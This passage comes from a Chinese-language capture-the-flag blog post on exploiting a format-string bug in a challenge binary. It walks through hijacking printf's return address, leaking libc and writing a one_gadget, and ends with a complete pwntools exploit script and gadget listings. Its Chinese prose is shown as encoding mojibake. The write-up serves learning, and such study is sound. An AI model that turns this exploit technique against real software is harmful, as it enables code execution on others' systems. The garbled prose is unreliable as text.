<p>ä¸Šé¢çš„ <code>printf</code> å‡½æ•°æ‰§è¡Œåï¼Œå°†åŸæœ¬ <code>0x7ffcd65f8988</code> æŒ‡å‘çš„ <code>0x7ffcd65fa31e</code> æ”¹æˆäº† <code>0x7ffcd65f8878</code> ï¼Œè¿™ä¸ª <code>0x7ffcd65f8878</code> æŒ‡å‘çš„ä½ç½®å°±æ˜¯ <code>printf</code> å‡½æ•°çš„è¿”å›åœ°å€ï¼ˆå› ä¸ºä¸‹å›¾çš„ <code>printf</code> å‡½æ•°å·²ç»æ‰§è¡Œå®Œæ¯•ï¼Œæ‰€ä»¥çœ‹çš„ä¸ç›´è§‚ï¼Œä½†è§‚å¯Ÿæ­¤æ—¶çš„ <code>rsp</code> ä¹Ÿèƒ½æ¨æµ‹å‡º <code>printf</code> å‡½æ•°çš„è¿”å›åœ°å€åº”è¯¥æ˜¯ä½äº <code>0x7ffcd65f8878</code>ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111505355.png" alt="image-20231211150546027"></p>
<p>å†ç”¨ä¸€ä¸ª <code>payload</code> é€šè¿‡ <code>0x7ffcd65f8878</code> ä¿®æ”¹æ‰ <code>printf</code> å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå°ç»†èŠ‚ã€‚å› ä¸ºæ­£å¸¸çš„è¿”å›åœ°å€æ˜¯ <code>0x55be41f00250</code> ï¼Œå‡è®¾æˆ‘æƒ³åŠ«æŒåˆ° <code>0x55be41f00223</code> ï¼Œåªéœ€è¦ä¿®æ”¹ä¸€ä¸ªå­—èŠ‚å³å¯ï¼Œä½†æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„åœ°å€å†™çš„æ—¶å€™ï¼Œåé¢å†™å…¥çš„å­—ç¬¦é‡ä¸€å®šè¦æ¯”å‰é¢çš„å¤§ã€‚å‡è®¾æœ‰ <code>%30c%16$hhn%40c%26$hhn</code> ï¼Œè¿™æ ·å†™åˆ°æ ˆé¡¶åç§» <code>20</code> çš„ä½ç½®ï¼Œå†™å…¥çš„å€¼æ˜¯ <code>70</code> ï¼ˆ<code>30+40</code> ï¼Œå¹¶éæ˜¯ <code>40</code>ï¼‰ã€‚</p>
<p>ä¸Šé¢çš„ <code>payload</code> ä¸º <code>%p%p%p%p%xxxc%hn</code> ä¸€å®šæ˜¯è¿œå¤§äºä¸€ä¸ªå­—èŠ‚æ‰€èƒ½è¡¨ç¤ºçš„èŒƒå›´ï¼Œå› æ­¤åé¢å°±è¦ç”¨æˆªæ–­çš„æ–¹å¼å†™è¿›å»ã€‚æ¯”å¦‚æˆ‘æƒ³å†™ä¸€ä¸ªå­—èŠ‚ <code>0x23</code> ï¼Œå°±åº”è¯¥å†™ <code>0x100023-xxx</code> åé¢ç”¨ <code>%hhn</code> æ¥æˆªæ–­æ‰å‰é¢çš„å€¼ï¼Œå°±ç•™æœ€åä¸€ä¸ªå­—èŠ‚ <code>0x23</code> ï¼ˆ<code>xxx</code> ä¸º <code>payload</code> å‰é¢éƒ¨åˆ†çš„å­—èŠ‚æ•°ï¼‰</p>
<p>æ˜ç™½äº†ä¸Šé¢çš„åˆ†æï¼Œå°†ä¸¤éƒ¨åˆ†çš„ <code>payload</code> ç»“åˆèµ·æ¥å°±æ˜¯è¿™æ ·ï¼ˆåé¢è¡¥å…¨ <code>0x100</code> ä¸ªå­—èŠ‚æ˜¯ç¡®ä¿ <code>read</code> ä¸ä¼šæŠŠæˆ‘ä¸¤æ¬¡å‘é€çš„ <code>payload</code> å½“æˆä¸€æ¬¡ç»™è¯»å…¥äº† ï¼‰</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>%p<span class="number">&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload+=b<span class="number">&#x27;</span>%<span class="string">&#x27;+str((value-0xc)-90).encode()+b&#x27;</span>c%hn<span class="number">&#x27;</span></span><br><span class="line">payload+=b<span class="number">&#x27;</span>%<span class="string">&#x27;+str(0x100023-((value-0xc))).encode()+b&#x27;</span>c%<span class="number">39</span>$hhn<span class="number">&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œè¿‡ <code>__vfprintf_internal</code> å‡½æ•°åï¼Œ<code>printf</code> çš„è¿”å›åœ°å€å·²ç»è¢«æ”¹æˆäº† <code>0x561e4dcc7223</code> ï¼Œè¿™é‡Œå›åˆ°äº† <code>read</code> å‡½æ•°ä¹‹å‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111532028.png" alt="image-20231211153228363"></p>
<p>éšåæˆ‘é‡ç°äº†æ¯”èµ›æ—¶çš„æ“ä½œï¼Œé¦–å…ˆä¿®æ”¹æ ˆé¡¶åç§» <code>5</code> çš„æ ˆé“¾ï¼Œå°†å…¶æŒ‡å‘ <code>printf</code> å‡½æ•°çš„è¿”å›åœ°å€ã€‚å†ä¿®æ”¹æ ˆé¡¶åç§» <code>0x21</code> çš„æŒ‡é’ˆï¼ˆç†è®ºä¸Šæ­¤æ—¶å·²ç»æŒ‡å‘ <code>printf</code> å‡½æ•°çš„è¿”å›åœ°å€ï¼‰ï¼Œä»è€Œæ§åˆ¶ <code>printf</code> è¿”å›åœ°å€</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111544487.png" alt="image-20231211154412789"></p>
<p><code>payload</code> å¦‚ä¸‹ï¼Œåœ¨ä¸è€ƒè™‘æ³„éœ²åœ°å€çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªçœ‹èµ·æ¥åº”è¯¥å’Œä¸Šæ–‡æåˆ°çš„ <code>payload</code> ç­‰æ•ˆ</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((value-<span class="number">0xc</span>)).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x100023</span>-((value-<span class="number">0xc</span>))).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>ä½†äº‹å®ä¸Šåœ¨ <code>__vfprintf_internal</code> å‡½æ•°æ‰§è¡Œåï¼Œä»…ä»…æ˜¯ä¿®æ”¹äº†ç¬¬ä¸€éƒ¨åˆ†çš„æŒ‡é’ˆï¼Œç¡®å®åšå‡ºäº†ä¸€ä¸ªæŒ‡å‘ <code>printf</code> è¿”å›åœ°å€çš„æŒ‡é’ˆï¼Œä½†ç¬¬äºŒéƒ¨åˆ†é€šè¿‡åˆšåˆšåšå‡ºçš„æŒ‡é’ˆå¹¶æ²¡æœ‰æˆåŠŸä¿®æ”¹æ‰ <code>printf</code> å‡½æ•°çš„è¿”å›åœ°å€</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111551025.png" alt="image-20231211155145574" style="zoom: 67%;" />

<p>æˆ‘ä¸èƒ½ç¡®å®šæ˜¯å¦å’Œ <code>$</code> æŒ‡å®šå‚æ•°æœ‰å…³ã€‚çŒœæµ‹ï¼šä»»æ„åœ°å€å†™ç”¨ <code>$</code> æŒ‡å®šå†™å…¥å’ŒæŒ‰å‚æ•°é¡ºåºå†™å…¥çš„æ“ä½œæ˜¯å…ˆååˆ†å¼€çš„ï¼Œå…ˆæŒ‰å‚æ•°é¡ºåºå†™å…¥æŒ‡é’ˆåï¼Œå†ç”¨ <code>$</code> å»åœ¨åˆšåˆšçš„æŒ‡é’ˆåŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹ã€‚<strong>æ³¨æ„ï¼šè¿™ä»…ä»…æ˜¯ä¸ªçŒœæµ‹ï¼ŒçœŸç›¸åº”è¯¥å»æºç ä¸­æ‰¾åˆ°ç­”æ¡ˆ</strong> ï¼ˆä»¥åæœ‰æœºä¼šçš„è¯ï¼Œæˆ‘åº”è¯¥ä¼šå»åˆ†æ <code>printf</code> å‡½æ•°çš„æºç ï¼Œæ¥æ¢ç©¶å‡ºè¿™ä¸ªç­”æ¡ˆï¼Œä½†å¯æƒœä¸æ˜¯ç°åœ¨ğŸ¤”ï¼‰</p>
<h2 id="åç»­åˆ©ç”¨"><a href="#åç»­åˆ©ç”¨" class="headerlink" title="åç»­åˆ©ç”¨"></a>åç»­åˆ©ç”¨</h2><p>å› ä¸ºæˆ‘æœ¬èº«å¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨è¾ƒä¸ºç†Ÿæ‚‰ï¼Œå½“çŸ¥é“ä¸Šé¢çš„æ–¹æ³•å¯ä»¥ä¸€æ¬¡å°±åŠ«æŒåˆ° <code>printf</code> å‡½æ•°è¿”å›åœ°å€ï¼Œé‚£ä¹ˆåç»­çš„æ€è·¯å°±æ˜æœ—äº†ã€‚é¦–å…ˆæŠŠ <code>libc</code> åœ°å€æ³„éœ²å‡ºæ¥ï¼Œç„¶åé€šè¿‡æ ˆé“¾å»ä¿®æ”¹ <code>printf</code> å‡½æ•°è¿”å›åœ°å€ä¸‹é¢ä¸€ä¸ªåœ°å€ä¸º <code>one_gadget</code> ï¼ˆå…ˆè°ƒè¯•ä¸€ä¸‹ï¼Œå‘ç°ç¬¬äºŒä¸ª <code>one_gadget</code> èƒ½ç”¨ï¼‰ï¼Œå¸ƒå±€å¥½ <code>one_gadget</code> åï¼Œæœ€åä¸€æ¬¡ä¿®æ”¹ <code>printf</code> å‡½æ•°è¿”å›åœ°å€ä¸º <code>ret</code> æŒ‡ä»¤çš„åœ°å€ï¼Œè¿™æ ·é€šè¿‡ <code>ret</code> å°† <code>one_gadget</code> æ‰§è¡Œã€‚</p>
<p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œç¨‹åºä¸­å¿…é¡»è¦å­˜åœ¨ä¸¤æ¡æ ˆé“¾æ‰èƒ½å¤Ÿåˆ©ç”¨æˆåŠŸã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæœ‰ä¸¤æ¡ä¸‰çº§æ ˆæŒ‡é’ˆã€‚ä¸€æ¡ç”¨æ¥æ¯æ¬¡ <code>printf</code> å‡½æ•°ç»“æŸååŠ«æŒè‡ªèº«çš„è¿”å›åœ°å€ï¼Œä¸€æ¡ç”¨æ¥å°† <code>one_gadget</code> æˆ– <code>system</code> ç­‰åœ°å€å†™å…¥åˆ°æ ˆå†…å­˜ä¸­ï¼ˆæˆ‘æœ€å¼€å§‹ç”¨ <code>ubuntu18.04</code> åšçš„ï¼Œç¨‹åºä¸­åªæœ‰ä¸€æ¡æ ˆé“¾ï¼Œæœ¬é¢˜å¦‚æœåªæœ‰ä¸€æ¡æ ˆé“¾çš„è¯ä¹Ÿæ˜¯æ²¡åŠæ³•åšçš„ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111640224.png" alt="image-20231211164022356"></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;fmt&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Gift: &#x27;</span>)</span><br><span class="line">value=<span class="built_in">int</span>(p.recv(<span class="number">4</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x121E</span>,<span class="number">0x1237</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((value-<span class="number">0xc</span>)-<span class="number">90</span>).encode()+<span class="string">b&#x27;c%hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x100023</span>-((value-<span class="number">0xc</span>))).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x100&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x10e1f2</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0xe3b01</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1260</span></span><br><span class="line">log_addr(<span class="string">&#x27;base&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((value-<span class="number">4</span>))-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((one_gadget&amp;<span class="number">0xffff</span>)-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%41$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((value-<span class="number">4</span>+<span class="number">2</span>))-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%41$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((value-<span class="number">4</span>+<span class="number">2</span>+<span class="number">2</span>))-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((one_gadget&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>)-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%41$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xc4</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111644018.png" alt="image-20231211164419663"></p>
<h2 id="å°¾å£°"><a href="#å°¾å£°" class="headerlink" title="å°¾å£°"></a>å°¾å£°</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„é¢˜ç›®åšè¿‡å¾ˆå¤šäº†ï¼Œä»æœ€åˆçš„å¤šæ¬¡æ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä»»æ„æ³„éœ²ï¼Œå†åˆ°å¤šæ¬¡ä»»æ„å†™ï¼Œå†åˆ°åŠ«æŒ <code>fini_array</code> <code>exit_hook</code> ç­‰ç­‰çš„å° <code>trick</code> ï¼Œåˆå‘å±•åˆ°å¤šæ¬¡éæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨ï¼Œè¿˜èƒ½å†ä¸Šå‡åˆ°å…³é—­è¾“å‡ºæµåçš„å¤šæ¬¡éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨ï¼Œæœ€åä¸Šå‡åˆ°ä¸€æ¬¡éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŠ  <code>exit</code> ç›´æ¥é€€å‡ºçš„åˆ©ç”¨ã€‚è¿™ä¸ªè¿‡ç¨‹ä¼¼ä¹ä¸€ç›´éƒ½åœ¨æŒ‘æˆ˜æœ‰é™æ¡ä»¶å†…æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨çš„æé™ï¼Œæ­¤æ—¶ä¼¼ä¹æˆ‘åˆå¯¹ <code>PWN</code> äº§ç”Ÿäº†ä¸€äº›æ–°çš„ç†è§£ï¼Œä»æœ€å¼€å§‹å¯¹åŸºç¡€æ¼æ´çš„å¥½å¥‡ï¼Œåˆ°ç°åœ¨é€æ¸æ¼”å˜æˆäº†å¯¹æ¼æ´åˆ©ç”¨æé™çš„å¥½å¥‡ï¼Œå„è·¯çš„ <code>PWN</code> å¸ˆå‚…ä»¬å¯èƒ½ä¹Ÿéƒ½åœ¨æ¢ç©¶å„ç§æ¼æ´æ‰€åˆ©ç”¨çš„æé™ã€‚</p>
<p>å””ï¼Œäº‹æƒ…å¥½åƒå˜çš„è¶Šæ¥è¶Šæœ‰è¶£äº†ğŸ¤”ã€‚ä¸è¿‡ç›®å‰ç•¥å¾®é—æ†¾çš„æ˜¯æ²¡æœ‰å¤ªå……è£•çš„æ—¶é—´å»è¯¦ç»†åˆ†æ <code>printf</code> å‡½æ•°æºç æ¥ææ¸…è¿™ä¸€åˆ‡ï¼Œæš‚æ—¶å…ˆé¸½äº†ğŸ§</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" rel="tag"># æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/f87d120.html" rel="prev" title="TP-Link SR20å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°">
                  <i class="fa fa-chevron-left"></i> TP-Link SR20å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/d34ee684.html" rel="next" title="BUUCTF_de1ctf_2019_unprintable">
                  BUUCTF_de1ctf_2019_unprintable <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ZIKH26</span>
  </div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

    </div>
  </footer>

  

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  <script src="/js/third-party/pace.js"></script>


  





</body>
</html>
